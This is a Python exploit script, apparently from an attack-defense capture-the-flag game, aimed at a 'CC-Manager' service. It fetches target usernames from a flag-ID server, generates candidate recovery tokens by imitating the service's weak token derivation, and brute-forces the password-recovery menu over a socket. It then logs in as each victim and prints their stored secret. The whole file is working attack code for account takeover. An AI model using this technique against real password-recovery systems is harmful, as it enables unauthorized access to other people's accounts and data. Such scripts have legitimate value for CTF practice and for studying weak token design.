#!/bin/python
import base64
import hmac
import hashlib
from pwn import remote 
import sys 
import json  
import subprocess
import requests
import subprocess
from collections import Counter
from hashlib import sha256, sha1
from Crypto.Util.number import getPrime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import inverse
import random
import re

def get_secret_tokens(username):
    mask = (1 << 768) - 1
    p, q = getPrime(768), getPrime(768)

    user_secret = p^q
    username_int = int.from_bytes(username.encode(), byteorder = "big")
    base_value = username_int

    for _ in range(250):
        base_value = base_value * user_secret
        base_value = base_value & mask

    recovery_token_int = (base_value & ((1 << 256) - 1)) ^ username_int
    sharing_key = (base_value >> 256) ^ user_secret
    recovery_token = sha256(recovery_token_int.to_bytes(32, byteorder = "big")).hexdigest()[:16]

    return recovery_token

def get_unique_recovery_passwords(user, n):
    unique_recovery_passwords = set()
    for _ in range(n):
        recovery_password = get_secret_tokens(user)
        unique_recovery_passwords.add(recovery_password)
    return unique_recovery_passwords

#ip = "10.60.0.1"
ip = sys.argv[1]
port = 5001
response = requests.get(f"http://10.10.0.1:8081/flagIds?service=CC-Manager&team={ip}") 
data = json.loads(response.text)
us = data["CC-Manager"]
us = us[ip]  
posrec = []

for x in us:
    username = re.search(r'"username": "(.*?)"', x).group(1)
    flag_password_name = re.search(r'"flag_password_name": "(.*?)"', x).group(1)
    posrec = get_unique_recovery_passwords(username, 50)
    r = remote(ip, port)
    for y in posrec:
        r.recv()
        r.sendline(b"3")
        r.recv()
        r.sendline(username.encode())
        r.recv()
        r.sendline(y.encode())
        pw = r.recvuntil(b"Exit")
        if "Here is your password:" in pw.decode():
            pw = re.search(r'Here is your password: (\w+)', pw.decode()).group(1)
            break
    r.sendline(b"2")
    r.recv()
    r.sendline(username.encode())
    r.recv()
    r.sendline(pw.encode())
    r.recv()
    r.sendline(b"2")
    r.recv()
    r.sendline(b"2")
    print(r.recv(),flush=True)
    r.close()
